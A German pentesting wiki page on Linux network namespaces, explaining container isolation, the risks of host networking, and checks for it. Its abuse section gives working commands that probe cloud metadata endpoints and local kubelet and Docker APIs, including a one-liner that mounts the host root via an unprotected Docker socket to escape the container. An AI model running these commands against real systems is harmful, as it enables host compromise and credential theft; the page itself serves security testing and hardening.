# Netzwerk-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Übersicht

Der Netzwerk-Namespace isoliert netzwerkbezogene Ressourcen wie Schnittstellen, IP-Adressen, Routing-Tabellen, ARP/neighbor-Zustand, Firewall-Regeln, Sockets und die Inhalte von Dateien wie `/proc/net`. Deshalb kann ein Container eine scheinbar eigene `eth0`, eigene lokale Routen und ein eigenes Loopback-Gerät haben, ohne den echten Netzwerk-Stack des Hosts zu besitzen.

Sicherheitsrelevant ist das, weil Netzwerkisolation weit mehr ist als Portbindung. Ein privater Netzwerk-Namespace begrenzt, was die Workload direkt beobachten oder umkonfigurieren kann. Sobald dieser Namespace mit dem Host geteilt wird, kann der Container plötzlich Sichtbarkeit auf Host-Listener, host-lokale Dienste und Netzwerk-Kontrollpunkte erhalten, die niemals für die Anwendung offengelegt werden sollten.

## Funktionsweise

Ein frisch erstellter Netzwerk-Namespace beginnt mit einer leeren oder nahezu leeren Netzwerkumgebung, bis Schnittstellen daran angebunden werden. Container-Runtimes erstellen oder verbinden dann virtuelle Schnittstellen, weisen Adressen zu und konfigurieren Routen, sodass die Workload die erwartete Konnektivität hat. In bridge-basierten Deployments bedeutet das in der Regel, dass der Container eine veth-gestützte Schnittstelle sieht, die mit einer Host-Bridge verbunden ist. In Kubernetes übernehmen CNI-Plugins das äquivalente Setup für Pod-Netzwerke.

Diese Architektur erklärt, warum `--network=host` oder `hostNetwork: true` eine so drastische Änderung ist. Anstatt einen vorbereiteten privaten Netzwerk-Stack zu erhalten, tritt die Workload dem tatsächlichen Netzwerk-Stack des Hosts bei.

## Labor

Sie können einen nahezu leeren Netzwerk-Namespace sehen mit:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Und du kannst normale und mit dem Host vernetzte Container wie folgt vergleichen:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Der Container, der das Host-Netzwerk verwendet, hat nicht mehr seine eigene isolierte Socket- und Interface-Ansicht. Allein diese Änderung ist bereits erheblich, noch bevor Sie fragen, welche capabilities der Prozess hat.

## Laufzeitnutzung

Docker und Podman erstellen normalerweise für jeden Container einen privaten Netzwerknamespace, sofern nicht anders konfiguriert. Kubernetes gibt in der Regel jedem Pod seinen eigenen Netzwerknamespace, der von den Containern innerhalb dieses Pods geteilt, aber vom Host getrennt ist. Incus/LXC-Systeme bieten ebenfalls eine ausgeprägte, auf Netzwerk-Namespaces basierende Isolation, oft mit einer größeren Vielfalt an virtuellen Netzwerk-Setups.

Das allgemeine Prinzip ist, dass private Netzwerke die Standard-Isolationsgrenze sind, während Host-Networking eine explizite Abwahl dieser Grenze darstellt.

## Fehlkonfigurationen

Die wichtigste Fehlkonfiguration ist schlicht das Teilen des Host-Netzwerknamespaces. Das geschieht manchmal aus Performance-, Low-Level-Monitoring- oder Komfortgründen, entfernt aber eine der saubersten Grenzen, die Containern zur Verfügung stehen. Host-lokale Listener werden direkter erreichbar, localhost-only Services können zugänglich werden, und capabilities wie `CAP_NET_ADMIN` oder `CAP_NET_RAW` werden deutlich gefährlicher, weil die von ihnen ermöglich­ten Operationen nun auf die Netzwerkumgebung des Hosts angewendet werden.

Ein weiteres Problem ist das Übergeben von netzwerkbezogenen capabilities selbst dann, wenn der Netzwerknamespace privat ist. Ein privater Namespace hilft zwar, macht raw sockets oder fortgeschrittene Netzwerksteuerung jedoch nicht harmlos.

## Missbrauch

In schwach isolierten Setups können Angreifer hostseitige Listening-Services inspizieren, Management-Endpunkte erreichen, die nur an loopback gebunden sind, Traffic sniffen oder stören — abhängig von den tatsächlichen capabilities und der Umgebung — oder Routing- und Firewall-Zustände neu konfigurieren, falls `CAP_NET_ADMIN` vorhanden ist. In einem Cluster kann das außerdem laterale Bewegung und control-plane reconnaissance erleichtern.

Wenn Sie Host-Networking vermuten, beginnen Sie damit zu bestätigen, dass die sichtbaren Interfaces und Listener zum Host gehören und nicht zu einem isolierten Container-Netzwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services sind oft die erste interessante Entdeckung:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Wenn Netzwerkfähigkeiten vorhanden sind, testen Sie, ob die Workload den sichtbaren Stack inspizieren oder ändern kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
In Cluster- oder Cloud-Umgebungen rechtfertigt Host-Networking auch eine schnelle lokale recon von Metadaten und control-plane-nahen Diensten:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Vollständiges Beispiel: Host Networking + Local Runtime / Kubelet Access

Host networking stellt nicht automatisch host root bereit, aber es exponiert häufig Dienste, die absichtlich nur vom node selbst erreichbar sind. Wenn einer dieser Dienste schwach geschützt ist, wird host networking zu einem direkten privilege-escalation path.

Docker API auf localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet auf localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Auswirkungen:

- direkte Kompromittierung des Hosts, wenn eine lokale Runtime-API ohne angemessenen Schutz exponiert ist
- Cluster-Aufklärung oder laterale Bewegung, wenn kubelet oder lokale Agenten erreichbar sind
- Verkehrsmanipulation oder denial of service, wenn kombiniert mit `CAP_NET_ADMIN`

## Prüfungen

Das Ziel dieser Prüfungen ist herauszufinden, ob der Prozess einen privaten Netzwerk-Stack hat, welche Routen und Listener sichtbar sind und ob die Netzwerkansicht bereits host-ähnlich aussieht, bevor Sie überhaupt capabilities testen.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Wenn die Namespace-Kennung oder die sichtbare Schnittstellenmenge wie die des Hosts aussieht, könnte host networking bereits verwendet werden.
- `ss -lntup` ist besonders wertvoll, da es ausschließlich auf Loopback gebundene Listener und lokale Management-Endpunkte aufdeckt.
- Routen, Schnittstellennamen und Firewall-Kontext werden deutlich wichtiger, wenn `CAP_NET_ADMIN` oder `CAP_NET_RAW` vorhanden sind.

Beim Überprüfen eines Containers sollte man das network namespace stets zusammen mit dem Capability-Set bewerten. Host networking plus starke Netzwerk-Capabilities stellt eine ganz andere Ausgangslage dar als bridge networking zusammen mit einem engen, standardmäßigen Capability-Set.
